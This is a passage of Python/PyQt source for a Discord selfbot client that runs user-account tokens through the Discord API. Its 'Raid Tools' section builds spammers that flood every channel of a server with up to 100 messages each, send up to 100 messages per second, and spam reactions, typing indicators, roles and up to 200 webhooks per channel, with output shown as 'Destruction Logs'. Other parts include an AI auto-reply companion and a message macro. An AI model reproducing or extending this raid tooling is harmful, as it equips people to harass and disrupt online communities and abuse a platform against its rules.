                self.ban_all_check.blockSignals(True)
                self.ban_all_check.setChecked(False)
                self.ban_all_check.blockSignals(False)

    def create_status_tab(self):
        widget = QWidget()
        widget.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(15)

        # --- Text Status Group ---
        text_status_group = QGroupBox("Custom Text Status Cycler")
        text_status_group.setStyleSheet("QGroupBox { color: white; }")
        text_status_layout = QVBoxLayout(text_status_group)

        self.status_text_input = ModernTextEdit()
        self.status_text_input.setPlaceholderText(
            "I like to :eat: popsicles\nUse :emoji_name: for server emojis.\nRequires Emoji Server ID below.")
        self.status_text_input.setFixedHeight(80)
        text_status_layout.addWidget(self.status_text_input)

        # NEW: Add Server ID input for Emojis
        emoji_server_id_label = QLabel("Emoji Server ID (for status emojis):")
        emoji_server_id_label.setStyleSheet("color: white; font-size: 11px;")
        self.status_emoji_server_id_input = ModernLineEdit()
        self.status_emoji_server_id_input.setPlaceholderText("Enter Server ID where the emoji is located...")
        self.status_emoji_server_id_input.setFixedHeight(40)  # Make it a bit smaller
        text_status_layout.addWidget(emoji_server_id_label)
        text_status_layout.addWidget(self.status_emoji_server_id_input)

        delay_layout = QHBoxLayout()
        delay_label = QLabel("Text Delay (s):")
        delay_label.setStyleSheet("color: white; font-size: 12px;")
        self.status_delay_slider = AnimatedSlider(Qt.Orientation.Horizontal)
        self.status_delay_slider.setRange(1, 60)
        self.status_delay_slider.setValue(5)
        self.status_delay_value_label = QLabel("5s")
        self.status_delay_value_label.setStyleSheet("color: white; font-size: 12px; min-width: 25px;")
        self.status_delay_slider.valueChanged.connect(lambda v: self.status_delay_value_label.setText(f"{v}s"))
        delay_layout.addWidget(delay_label)
        delay_layout.addWidget(self.status_delay_slider)
        delay_layout.addWidget(self.status_delay_value_label)
        text_status_layout.addLayout(delay_layout)
        layout.addWidget(text_status_group)

        # --- Presence Status Group ---
        self.status_presence_group = QGroupBox("Online Presence Cycler")
        self.status_presence_group.setStyleSheet("QGroupBox { color: white; }")
        presence_status_layout = QVBoxLayout(self.status_presence_group)

        self.status_cycle_presence_check = AnimatedCheckBox("Enable Presence Cycling")
        presence_status_layout.addWidget(self.status_cycle_presence_check)

        checkbox_layout = QHBoxLayout()
        checkbox_layout.addWidget(AnimatedCheckBox("online"))
        checkbox_layout.addWidget(AnimatedCheckBox("idle"))
        checkbox_layout.addWidget(AnimatedCheckBox("dnd"))
        # NEW: Add Invisible checkbox
        checkbox_layout.addWidget(AnimatedCheckBox("invisible"))
        presence_status_layout.addLayout(checkbox_layout)

        presence_delay_layout = QHBoxLayout()
        presence_delay_label = QLabel("Presence Delay (s):")
        presence_delay_label.setStyleSheet("color: white; font-size: 12px;")
        self.status_presence_delay_slider = AnimatedSlider(Qt.Orientation.Horizontal)
        self.status_presence_delay_slider.setRange(1, 60)
        self.status_presence_delay_slider.setValue(10)
        self.status_presence_delay_value_label = QLabel("10s")
        self.status_presence_delay_value_label.setStyleSheet("color: white; font-size: 12px; min-width: 25px;")
        self.status_presence_delay_slider.valueChanged.connect(
            lambda v: self.status_presence_delay_value_label.setText(f"{v}s"))
        presence_delay_layout.addWidget(presence_delay_label)
        presence_delay_layout.addWidget(self.status_presence_delay_slider)
        presence_delay_layout.addWidget(self.status_presence_delay_value_label)
        presence_status_layout.addLayout(presence_delay_layout)
        layout.addWidget(self.status_presence_group)

        # --- Start Button ---
        self.start_status_changer_btn = MinimalButton("START STATUS CHANGER")
        self.start_status_changer_btn.clicked.connect(self.start_status_changer)
        layout.addWidget(self.start_status_changer_btn)

        layout.addStretch()
        return widget

    def create_updates_container(self):
        outer_container = QWidget(self)
        outer_container.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        outer_layout = QHBoxLayout(outer_container)
        outer_layout.setContentsMargins(0, 0, 0, 0)
        outer_layout.addStretch(1)

        container = QWidget(outer_container)
        container.setMinimumSize(600, 400)
        container.setSizePolicy(QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Expanding)
        container.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        container_layout = QVBoxLayout(container)
        container_layout.setContentsMargins(0, 0, 0, 0)
        container_layout.setSpacing(0)

        section_title = QLabel("Raid Tools", container)
        section_title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        section_title.setStyleSheet(
            "color: white; font-size: 20px; font-weight: bold; padding: 15px; background: rgba(26, 32, 44, 0.7); border-top-left-radius: 15px; border-top-right-radius: 15px; margin-bottom: 0px;")
        container_layout.addWidget(section_title)

        tab_buttons_layout = QHBoxLayout()
        tab_buttons_layout.setContentsMargins(20, 0, 20, 0)
        tab_buttons_layout.setSpacing(5)
        tab_buttons_layout.setAlignment(Qt.AlignmentFlag.AlignLeft)

        self.updates_tab_buttons.setExclusive(True)

        self.updates_tabs_stack.setStyleSheet("""
            QStackedWidget {
                background: rgba(26, 32, 44, 0.7); border: 1px solid rgba(255, 255, 255, 0.1);
                border-top-right-radius: 15px; border-bottom-left-radius: 15px; border-bottom-right-radius: 15px;
                margin-top: 0px; box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.2);
            }
        """)

        tab_names = ["Spammer", "Troll", "Roles", "Webhooks"]
        for i, name in enumerate(tab_names):
            tab_button = TabButton(name, container)
            tab_button.clicked.connect(lambda checked, index=i: self.switch_sub_tab(self.updates_tabs_stack, index))
            tab_buttons_layout.addWidget(tab_button)
            self.updates_tab_buttons.addButton(tab_button, i)

        self.updates_tabs_stack.addWidget(self.create_spammer_tab())
        self.updates_tabs_stack.addWidget(self.create_troll_tab())
        self.updates_tabs_stack.addWidget(self.create_role_spammer_tab())
        self.updates_tabs_stack.addWidget(self.create_webhook_spammer_tab())

        tab_buttons_layout.addStretch(1)

        container_layout.addLayout(tab_buttons_layout)
        container_layout.addWidget(self.updates_tabs_stack)
        container_layout.addStretch(1)

        outer_layout.addWidget(container)
        outer_layout.addStretch(1)

        self.updates_tab_buttons.button(0).setChecked(True)
        self.updates_tabs_stack.setCurrentIndex(0)

        return outer_container

    def create_spammer_tab(self):
        widget = QWidget()
        widget.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(20)

        self.nuclear_btn = MinimalButton("SPAM ALL CHANNELS")
        self.nuclear_btn.clicked.connect(lambda: self.start_spam_mode("nuclear"))
        layout.addWidget(self.nuclear_btn)

        nuclear_msg_count_layout = QHBoxLayout()
        nuclear_msg_count_label = QLabel("Messages/Channel:")
        nuclear_msg_count_label.setStyleSheet("color: white; font-size: 12px;")
        self.nuclear_msg_count_slider = AnimatedSlider(Qt.Orientation.Horizontal)
        self.nuclear_msg_count_slider.setRange(1, 100)
        self.nuclear_msg_count_slider.setValue(100)
        self.nuclear_msg_count_slider.setStyleSheet("""
            QSlider::groove:horizontal { border: 1px solid #999; height: 8px; background: rgba(74, 85, 104, 0.4); margin: 2px 0; border-radius: 4px; }
            QSlider::handle:horizontal { background: rgba(99, 179, 237, 0.8); border: 1px solid rgba(99, 179, 237, 0.9); width: 18px; margin: -5px 0; border-radius: 9px; }
            QSlider::sub-page:horizontal { background: rgba(99, 179, 237, 0.6); border: 1px solid #777; height: 10px; border-radius: 4px; }
        """)
        self.nuclear_msg_count_value_label = QLabel("100", self)
        self.nuclear_msg_count_value_label.setStyleSheet("color: white; font-size: 12px; margin-left: 10px;")
        self.nuclear_msg_count_slider.valueChanged.connect(self.update_nuclear_msg_count_label)
        nuclear_msg_count_layout.addWidget(nuclear_msg_count_label)
        nuclear_msg_count_layout.addWidget(self.nuclear_msg_count_slider)
        nuclear_msg_count_layout.addWidget(self.nuclear_msg_count_value_label)
        layout.addLayout(nuclear_msg_count_layout)

        self.turbo_btn = MinimalButton("SPAM")
        self.turbo_btn.clicked.connect(lambda: self.start_spam_mode("turbo"))
        layout.addWidget(self.turbo_btn)

        delay_layout = QHBoxLayout()
        delay_label = QLabel("Messages/sec")
        delay_label.setStyleSheet("color: white; font-size: 12px;")
        self.turbo_delay_slider = AnimatedSlider(Qt.Orientation.Horizontal)
        self.turbo_delay_slider.setRange(1, 100)
        self.turbo_delay_slider.setValue(20)
        self.turbo_delay_slider.setStyleSheet(self.nuclear_msg_count_slider.styleSheet())
        self.turbo_delay_value_label = QLabel("20", self)
        self.turbo_delay_value_label.setStyleSheet("color: white; font-size: 12px; margin-left: 10px;")
        self.turbo_delay_slider.valueChanged.connect(self.update_turbo_delay_label)
        delay_layout.addWidget(delay_label)
        delay_layout.addWidget(self.turbo_delay_slider)
        delay_layout.addWidget(self.turbo_delay_value_label)
        layout.addLayout(delay_layout)

        logs_label = QLabel("Destruction Logs:")
        logs_label.setStyleSheet("color: white; font-size: 12px;")
        layout.addWidget(logs_label)
        self.logs = ModernTextEdit(self)
        self.logs.setReadOnly(True)
        layout.addWidget(self.logs)

        return widget

    def create_troll_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(20)

        reaction_group = QGroupBox("Reaction Spammer")
        reaction_group.setStyleSheet(
            "QGroupBox { color: white; font-size: 14px; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 10px; margin-top: 10px; } QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 3px; color: white; }")
        reaction_layout = QVBoxLayout(reaction_group)
        self.reaction_channel_id_input = ModernLineEdit()
        self.reaction_channel_id_input.setPlaceholderText("Enter Channel ID...")
        reaction_layout.addWidget(self.reaction_channel_id_input)
        self.reaction_message_id_input = ModernLineEdit()
        self.reaction_message_id_input.setPlaceholderText("Enter Message ID...")
        reaction_layout.addWidget(self.reaction_message_id_input)
        self.start_reaction_btn = MinimalButton("START REACTION SPAM")
        self.start_reaction_btn.clicked.connect(lambda: self.start_spam_mode("reaction_spammer"))
        reaction_layout.addWidget(self.start_reaction_btn)
        layout.addWidget(reaction_group)

        # NEW: Ghost Typer GroupBox
        ghost_typer_group = QGroupBox("Ghost Typer")
        ghost_typer_group.setStyleSheet(
            "QGroupBox { color: white; font-size: 14px; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 10px; margin-top: 10px; } QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 3px; color: white; }")
        ghost_typer_layout = QVBoxLayout(ghost_typer_group)

        info_label = QLabel(
            "Starts a continuous typing indicator in the specified Channel ID (from the 'Main Functions -> Panel' tab).")
        info_label.setStyleSheet("color: #A0AEC0; background: transparent;")
        info_label.setWordWrap(True)
        ghost_typer_layout.addWidget(info_label)

        self.start_ghost_typer_btn = MinimalButton("START GHOST TYPING")
        self.start_ghost_typer_btn.clicked.connect(self.start_ghost_typer)
        ghost_typer_layout.addWidget(self.start_ghost_typer_btn)
        layout.addWidget(ghost_typer_group)
        # END NEW

        layout.addStretch()
        return widget

    def create_role_spammer_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(20)

        self.role_name_input = ModernLineEdit()
        self.role_name_input.setPlaceholderText("Enter role name (leave blank for random)...")
        layout.addWidget(self.role_name_input)

        self.start_role_spammer_btn = MinimalButton("START ROLE SPAM")
        self.start_role_spammer_btn.clicked.connect(lambda: self.start_spam_mode("role_spammer"))
        layout.addWidget(self.start_role_spammer_btn)
        layout.addStretch()
        return widget

    def create_webhook_spammer_tab(self):
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(30, 30, 30, 30)
        layout.setSpacing(20)

        webhook_group = QGroupBox("Super-Fast Webhook Spammer")
        webhook_group.setStyleSheet(
            "QGroupBox { color: white; font-size: 14px; border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 10px; margin-top: 10px; } QGroupBox::title { subcontrol-origin: margin; left: 10px; padding: 0 3px; color: white; }")
        webhook_layout = QVBoxLayout(webhook_group)

        self.webhook_message_input = ModernLineEdit()
        self.webhook_message_input.setPlaceholderText("Enter webhook message (leave blank for random)...")
        webhook_layout.addWidget(self.webhook_message_input)

        webhook_count_layout = QHBoxLayout()
        webhook_count_label = QLabel("Power (Webhooks per Channel):")
        webhook_count_label.setStyleSheet("color: white; font-size: 12px;")
        self.webhook_count_slider = AnimatedSlider(Qt.Orientation.Horizontal)
        self.webhook_count_slider.setRange(1, 200)
        self.webhook_count_slider.setValue(10)
        self.webhook_count_value_label = QLabel("10")
        self.webhook_count_value_label.setStyleSheet("color: white; font-size: 12px;")
        self.webhook_count_slider.valueChanged.connect(lambda v: self.webhook_count_value_label.setText(str(v)))
        webhook_count_layout.addWidget(webhook_count_label)
        webhook_count_layout.addWidget(self.webhook_count_slider)
        webhook_count_layout.addWidget(self.webhook_count_value_label)
        webhook_layout.addLayout(webhook_count_layout)

        self.webhook_single_channel_check = AnimatedCheckBox("Target Single Channel")
        self.webhook_target_channel_id_input = ModernLineEdit()
        self.webhook_target_channel_id_input.setPlaceholderText("Enter Channel ID to target...")
        self.webhook_target_channel_id_input.setVisible(False)
        self.webhook_single_channel_check.toggled.connect(self.webhook_target_channel_id_input.setVisible)
        webhook_layout.addWidget(self.webhook_single_channel_check)
        webhook_layout.addWidget(self.webhook_target_channel_id_input)

        buttons_layout = QVBoxLayout()
        self.create_btn = MinimalButton("CREATE ONLY")
        self.create_btn.clicked.connect(lambda: self.start_spam_mode("webhook_create_only"))
        buttons_layout.addWidget(self.create_btn)

        self.start_btn = MinimalButton("CREATE/SPAM")
        self.start_btn.clicked.connect(lambda: self.start_spam_mode("webhook_spammer"))
        buttons_layout.addWidget(self.start_btn)

        self.start_existing_btn = MinimalButton("SPAM EXISTING")
        self.start_existing_btn.clicked.connect(lambda: self.start_spam_mode("webhook_spam_existing"))
        buttons_layout.addWidget(self.start_existing_btn)

        webhook_layout.addLayout(buttons_layout)

        layout.addWidget(webhook_group)
        layout.addStretch()
        return widget


    def toggle_performance_mode(self, checked):
        """Turns animations on or off based on the checkbox."""
        if self.animated_background and self.animated_background.timer:
            if checked:
                self.animated_background.timer.stop()
                self.log("[⚙️] Performance Mode: ON (Animations Disabled)")
            else:
                self.animated_background.timer.start()
                self.log("[⚙️] Performance Mode: OFF (Animations Enabled)")



    def create_ai_chat_container(self):
        outer_container = QWidget(self)
        outer_container.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        outer_layout = QHBoxLayout(outer_container)
        outer_layout.setContentsMargins(0, 0, 0, 0)
        outer_layout.addStretch(1)

        container = QWidget(outer_container)
        container.setMinimumSize(600, 400)
        container.setSizePolicy(QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Expanding)
        container.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)

        container_layout = QVBoxLayout(container)
        container_layout.setContentsMargins(0, 0, 0, 0)
        container_layout.setSpacing(0)

        section_title = QLabel("AI Companion", container)
        section_title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        section_title.setStyleSheet(
            "color: white; font-size: 20px; font-weight: bold; padding: 15px; background: rgba(26, 32, 44, 0.7); border-top-left-radius: 15px; border-top-right-radius: 15px; margin-bottom: 0px;")
        container_layout.addWidget(section_title)

        content_area = QWidget()
        content_area.setStyleSheet("""
            background: rgba(26, 32, 44, 0.7); border: 1px solid rgba(255, 255, 255, 0.1);
            border-top-right-radius: 15px; border-bottom-left-radius: 15px; border-bottom-right-radius: 15px;
            margin-top: 0px; box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.2);
        """)
        content_layout = QVBoxLayout(content_area)
        content_layout.setContentsMargins(30, 30, 30, 30)
        content_layout.setSpacing(15)

        prompt_label = QLabel("System Prompt (Personality for the AI)")
        prompt_label.setStyleSheet("color: white; font-size: 12px; font-weight: 500; background: transparent;")
        self.ai_system_prompt_input = ModernTextEdit()
        self.ai_system_prompt_input.setPlaceholderText(
            "For example: You are a helpful assistant. Keep your replies short and witty.")
        self.ai_system_prompt_input.setFixedHeight(120)
        content_layout.addWidget(prompt_label)
        content_layout.addWidget(self.ai_system_prompt_input)

        # --- MODEL SELECTION ---
        self.use_gemini_check = AnimatedCheckBox("Use Google Gemini API (Cloud)")
        self.use_gemini_check.setToolTip("Uncheck to use Local LM Studio")
        content_layout.addWidget(self.use_gemini_check)

        # Container for Input Switching
        self.model_input_stack = QStackedWidget()
        self.model_input_stack.setStyleSheet("background: transparent;")
        self.model_input_stack.setFixedHeight(60)

        # Page 1: LM Studio
        page_lm = QWidget()
        layout_lm = QVBoxLayout(page_lm)
        layout_lm.setContentsMargins(0,0,0,0)
        url_label = QLabel("LM Studio URL (Local):")
        url_label.setStyleSheet("color: white; font-size: 12px;")
        self.lm_studio_url_input = ModernLineEdit()
        self.lm_studio_url_input.setText("http://localhost:1234/v1/chat/completions")
        layout_lm.addWidget(url_label)
        layout_lm.addWidget(self.lm_studio_url_input)
        self.model_input_stack.addWidget(page_lm)

        # Page 2: Gemini
        page_gem = QWidget()
        layout_gem = QVBoxLayout(page_gem)
        layout_gem.setContentsMargins(0,0,0,0)
        key_label = QLabel("Google Gemini API Key:")
        key_label.setStyleSheet("color: white; font-size: 12px;")
        self.gemini_api_key_input = ModernLineEdit()
        self.gemini_api_key_input.setPlaceholderText("Enter your AIza... key here")
        # Mask the key for privacy
        self.gemini_api_key_input.setEchoMode(QLineEdit.EchoMode.Password) 
        layout_gem.addWidget(key_label)
        layout_gem.addWidget(self.gemini_api_key_input)
        self.model_input_stack.addWidget(page_gem)

        # Connect Logic
        self.use_gemini_check.toggled.connect(lambda checked: self.model_input_stack.setCurrentIndex(1 if checked else 0))

        content_layout.addWidget(self.model_input_stack)

        # --- Checkboxes for AI options ---
        options_group = QGroupBox("")
        options_group.setStyleSheet("QGroupBox { border: none; }")
        options_layout = QVBoxLayout(options_group)
        options_layout.setContentsMargins(0, 0, 0, 0)
        
        self.enable_ai_in_dms_checkbox = AnimatedCheckBox("Enable AI in DMs")
        options_layout.addWidget(self.enable_ai_in_dms_checkbox)

        self.ai_streaming_checkbox = AnimatedCheckBox("Enable Response Streaming (Typing Effect)")
        self.ai_streaming_checkbox.setChecked(True)
        options_layout.addWidget(self.ai_streaming_checkbox)

        self.ai_typing_notification_checkbox = AnimatedCheckBox("Enable Typing Notification Before Reply")
        options_layout.addWidget(self.ai_typing_notification_checkbox)

        self.ai_typing_duration_widget = QWidget()
        typing_duration_layout = QHBoxLayout(self.ai_typing_duration_widget)
        typing_duration_layout.setContentsMargins(20, 0, 0, 0)

        duration_label = QLabel("Typing Duration (s):")
        duration_label.setStyleSheet("color: white; font-size: 11px;")
        
        self.ai_typing_duration_spinbox = QSpinBox()
        self.ai_typing_duration_spinbox.setRange(1, 60)
        self.ai_typing_duration_spinbox.setValue(5)
        self.ai_typing_duration_spinbox.setSuffix("s")
        self.ai_typing_duration_spinbox.setStyleSheet("""
            QSpinBox { 
                background: rgba(26, 32, 44, 0.6); 
                border: 1.5px solid rgba(74, 85, 104, 0.4); 
                border-radius: 8px; color: white; padding: 5px 10px; 
                font-size: 11px; 
            }
        """)
        
        typing_duration_layout.addWidget(duration_label)
        typing_duration_layout.addWidget(self.ai_typing_duration_spinbox)
        typing_duration_layout.addStretch()

        options_layout.addWidget(self.ai_typing_duration_widget)
        self.ai_typing_duration_widget.setVisible(False)
        self.ai_typing_notification_checkbox.toggled.connect(self.ai_typing_duration_widget.setVisible)

        content_layout.addWidget(options_group)
        content_layout.addStretch(1)

        self.start_ai_bot_btn = MinimalButton("START AI COMPANION")
        self.start_ai_bot_btn.clicked.connect(self.start_ai_bot)
        content_layout.addWidget(self.start_ai_bot_btn)

        container_layout.addWidget(content_area)
        outer_layout.addWidget(container)
        outer_layout.addStretch(1)

        return outer_container




    def start_ai_bot(self): 
        if not self.tokens:
            self.log("[❌] No tokens loaded.")
            return

        lm_studio_url = self.lm_studio_url_input.text().strip()
        use_gemini = self.use_gemini_check.isChecked()
        gemini_key = self.gemini_api_key_input.text().strip()

        if use_gemini and not gemini_key:
            self.log("[❌] Google Gemini API Key is required.")
            return
        elif not use_gemini and not lm_studio_url:
            self.log("[❌] LM Studio URL is required.")
            return

        self.log(f"[🤖] Starting AI Companion ({'Gemini' if use_gemini else 'Local'})...")
        self.start_ai_bot_btn.setEnabled(False)

        system_prompt = self.ai_system_prompt_input.toPlainText()
        enable_ai_in_dms = self.enable_ai_in_dms_checkbox.isChecked()
        enable_streaming = self.ai_streaming_checkbox.isChecked()
        enable_typing = self.ai_typing_notification_checkbox.isChecked()
        typing_duration = self.ai_typing_duration_spinbox.value()

        ai_bot = AICompanionBot(
            tokens=self.tokens,
            system_prompt=system_prompt,
            lm_studio_url=lm_studio_url,
            use_gemini=use_gemini,      # <-- New
            gemini_key=gemini_key,      # <-- New
            enable_ai_in_dms=enable_ai_in_dms,
            enable_streaming=enable_streaming,
            enable_typing_notification=enable_typing,
            typing_duration=typing_duration,
            initiating_button=self.start_ai_bot_btn
        )
        ai_bot.update_signal.connect(self.log)
        ai_bot.finished.connect(self.on_bot_finished)
        self.running_bots.append(ai_bot)
        self.set_stop_button_enabled.emit(True)
        ai_bot.start()



    def create_commands_container(self):
        self.guild_emoji_cache = {}  # Initialize emoji cache
        outer_container = QWidget(self)
        outer_container.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)
        outer_layout = QHBoxLayout(outer_container)
        outer_layout.setContentsMargins(0, 0, 0, 0)
        outer_layout.addStretch(1)

        container = QWidget(outer_container)
        container.setMinimumSize(600, 400)
        container.setSizePolicy(QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Expanding)
        container.setAttribute(Qt.WidgetAttribute.WA_TranslucentBackground)

        container_layout = QVBoxLayout(container)
        container_layout.setContentsMargins(0, 0, 0, 0)
        container_layout.setSpacing(0)

        section_title = QLabel("Custom Commands", container)
        section_title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        section_title.setStyleSheet(
            "color: white; font-size: 20px; font-weight: bold; padding: 15px; background: rgba(26, 32, 44, 0.7); border-top-left-radius: 15px; border-top-right-radius: 15px; margin-bottom: 0px;")
        container_layout.addWidget(section_title)

        tab_buttons_layout = QHBoxLayout()
        tab_buttons_layout.setContentsMargins(20, 0, 20, 0)
        tab_buttons_layout.setSpacing(5)
        tab_buttons_layout.setAlignment(Qt.AlignmentFlag.AlignLeft)

        self.commands_tab_buttons.setExclusive(True)

        self.commands_tabs_stack.setStyleSheet("""
               QStackedWidget {
                   background: rgba(26, 32, 44, 0.7); border: 1px solid rgba(255, 255, 255, 0.1);
                   border-top-right-radius: 15px; border-bottom-left-radius: 15px; border-bottom-right-radius: 15px;
                   margin-top: 0px; box-shadow: inset 0 0 10px rgba(0, 0, 0, 0.2);
               }
           """)

        tab_names = ["Editor", "Manage List", "Macro", "Listener/Logs"]
        for i, name in enumerate(tab_names):
            tab_button = TabButton(name, container)
            tab_button.clicked.connect(lambda checked, index=i: self.switch_sub_tab(self.commands_tabs_stack, index))
            tab_buttons_layout.addWidget(tab_button)
            self.commands_tab_buttons.addButton(tab_button, i)

        self.commands_tabs_stack.addWidget(self.create_command_editor_tab())
        self.commands_tabs_stack.addWidget(self.create_command_list_tab())
        self.commands_tabs_stack.addWidget(self.create_macro_tab())
        self.commands_tabs_stack.addWidget(self.create_command_listener_tab())

        tab_buttons_layout.addStretch(1)
        container_layout.addLayout(tab_buttons_layout)
        container_layout.addWidget(self.commands_tabs_stack)

        outer_layout.addWidget(container)
        outer_layout.addStretch(1)

        self.commands_tab_buttons.button(0).setChecked(True)
        self.commands_tabs_stack.setCurrentIndex(0)

        self.current_command_actions = []
        return outer_container

    def create_macro_tab(self):
        """Creates the UI for the new Macro tab with a 3x3 image grid."""
        widget = QWidget()
        layout = QVBoxLayout(widget)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(15)

        macro_group = QGroupBox("Message Macro")
        macro_group.setStyleSheet("QGroupBox { color: white; }")
        macro_layout = QVBoxLayout(macro_group)

        # Channel ID Input
        channel_id_label = QLabel("Channel ID:")
        channel_id_label.setStyleSheet("color: white; font-size: 11px;")
        self.macro_channel_id_input = ModernLineEdit()
        self.macro_channel_id_input.setPlaceholderText("Enter the channel ID to send messages in...")
        macro_layout.addWidget(channel_id_label)
        macro_layout.addWidget(self.macro_channel_id_input)

        # Message Input with Image Pasting
        message_label = QLabel("Message Content (Paste an image with Ctrl+V):")
        message_label.setStyleSheet("color: white; font-size: 11px;")
        self.macro_message_input = ImagePastingTextEdit()  # Use the custom widget
        self.macro_message_input.setPlaceholderText(
            "Your message here...\nUse :emoji_name: for server emojis.\nYou can paste up to 9 images.")
        self.macro_message_input.setFixedHeight(100)
        macro_layout.addWidget(message_label)
        macro_layout.addWidget(self.macro_message_input)
        
        self.macro_random_message_check = AnimatedCheckBox("Send Random Message From List")
        self.macro_random_message_check.setChecked(True)
        self.macro_random_message_check.setToolTip("If checked, a random line from the box above will be sent.\nIf unchecked, the entire text content is sent as one message.")
        macro_layout.addWidget(self.macro_random_message_check)

        self.macro_image_grid = ImagePreviewGrid()  # Use the new grid widget
        macro_layout.addWidget(self.macro_image_grid)
        self.macro_message_input.imagePasted.connect(self.handle_image_paste)
        delay_label = QLabel("Delay (seconds):")
        delay_label.setStyleSheet("color: white; font-size: 11px;")
        self.macro_delay_input = ModernLineEdit()
        self.macro_delay_input.setPlaceholderText("For example 1-5.")
        self.macro_delay_input.setValidator(QDoubleValidator(0.1, 9999.0, 2))
        macro_layout.addWidget(delay_label)
        macro_layout.addWidget(self.macro_delay_input)

        self.start_macro_btn = MinimalButton("START MACRO")
        self.start_macro_btn.clicked.connect(self.start_macro)
        macro_layout.addWidget(self.start_macro_btn)

        layout.addWidget(macro_group)
        layout.addStretch()
        return widget

    def handle_image_paste(self, image: QImage):
        """This slot handles the imagePasted signal and adds the image to the grid."""
        self.log("[INFO] Image pasted from clipboard.")
        # Attempt to add the image to the grid
        success = self.macro_image_grid.add_image(image)
        if not success:
            self.log("[WARNING] Could not add image, all 9 image slots are full.")
            CustomMessageBox.warning(self, "Image Slots Full", "You have already added the maximum of 9 images.")

    def send_macro_message(self, token, channel_id, message, images_data=None):
        """Resolves emojis and sends a message with multiple images."""
        if images_data is None:
            images_data = []
        temp_bot_instance = MidnightClientSelfBot([token], {})
        
        guild_id = None
        try:
            channel_res = temp_bot_instance.make_request("GET", f"https://discord.com/api/v9/channels/{channel_id}", token)
            if channel_res and channel_res.status_code == 200:
                guild_id = channel_res.json().get('guild_id')
        except Exception as e:
            self.log(f"[Macro Error] Could not get guild ID for emoji resolution: {e}")

        resolved_message = message
        if guild_id:
            if guild_id not in self.guild_emoji_cache:
                try:
                    emoji_res = temp_bot_instance.make_request("GET", f"https://discord.com/api/v9/guilds/{guild_id}/emojis", token)
                    if emoji_res and emoji_res.status_code == 200:
                        self.guild_emoji_cache[guild_id] = {e['name']: (e['id'], e['animated']) for e in emoji_res.json()}
                except Exception:
                    self.guild_emoji_cache[guild_id] = {} # Cache failure on error
            
            emoji_map = self.guild_emoji_cache.get(guild_id, {})
            resolved_message = re.sub(
                r':([a-zA-Z0-9_~\-]+):', 
                lambda m: f"<{'a' if emoji_map.get(m.group(1), (0, False))[1] else ''}:{m.group(1)}:{emoji_map.get(m.group(1), (0, False))[0]}>" if m.group(1) in emoji_map else m.group(0), 
                message
            )

        # Message sending logic
        endpoint = f"https://discord.com/api/v9/channels/{channel_id}/messages"
        headers = {"Authorization": token}
        
        # Prepare multipart form data if there are images
        if images_data:
            files = {}
            for i, img_data in enumerate(images_data):
                files[f"files[{i}]"] = (f"image_{i}.png", img_data, "image/png")
            
            payload_json = {"content": resolved_message}
            data = {'payload_json': json.dumps(payload_json)}
            
            try:
                r = requests.post(endpoint, headers=headers, data=data, files=files, timeout=20)
                if 200 <= r.status_code < 300:
                    self.log(f"  -> Macro sent message with {len(images_data)} image(s).")
                    return True
                else:
                    self.log(f"[❌] Macro Error (Image): {r.status_code} - {r.text}")
                    return False
            except requests.RequestException as e:
                self.log(f"[❌] Macro network error (Image): {e}")
                return False
        # Send a simple message if there are no images
        elif resolved_message:
            payload = {"content": resolved_message}
            try:
                r = requests.post(endpoint, headers=headers, json=payload, timeout=10)
                if 200 <= r.status_code < 300:
                    self.log("  -> Macro sent message.")
                    return True
                else:
                    self.log(f"[❌] Macro Error (Text): {r.status_code} - {r.text}")
                    return False
            except requests.RequestException as e:
                self.log(f"[❌] Macro network error (Text): {e}")
                return False
        
        return True # Return true if there was nothing to send



    def start_macro(self):
        """Handles the logic for starting the macro."""
        if not self.tokens:
            self.log("[❌] No tokens loaded.")
            return

        channel_id = self.macro_channel_id_input.text().strip()
        messages = [line.strip() for line in self.macro_message_input.toPlainText().split('\n') if line.strip()]
        delay_str = self.macro_delay_input.text().strip()
        images_data = self.macro_image_grid.get_all_images_data()
        use_random = self.macro_random_message_check.isChecked()

        # --- FIX: Validate Inputs ---
        if not channel_id or not channel_id.isdigit():
            self.log("[❌] Macro Error: Invalid Channel ID.")
            CustomMessageBox.warning(self, "Input Error", "Please enter a valid numeric Channel ID.")
            return

        if not messages and not images_data:
            self.log("[❌] Macro Error: Message or Image required.")
            CustomMessageBox.warning(self, "Input Error", "Please provide a message or an image.")
            return
        # ----------------------------

        try:
            delay = float(delay_str)
            if delay < 0.1: raise ValueError("Delay too short")
        except (ValueError, TypeError):
            self.log("[❌] Macro Error: Invalid delay.")
            CustomMessageBox.warning(self, "Input Error", "Please enter a valid delay number (e.g. 1.5).")
            return
        
        self.log(f"[▶️] Initializing MacroBot for channel {channel_id}...")
        self.start_macro_btn.setEnabled(False)

        macro_bot = MacroBot(
            token=self.tokens[0],
            channel_id=channel_id,
            messages=messages,
            use_random=use_random,
            delay=delay,
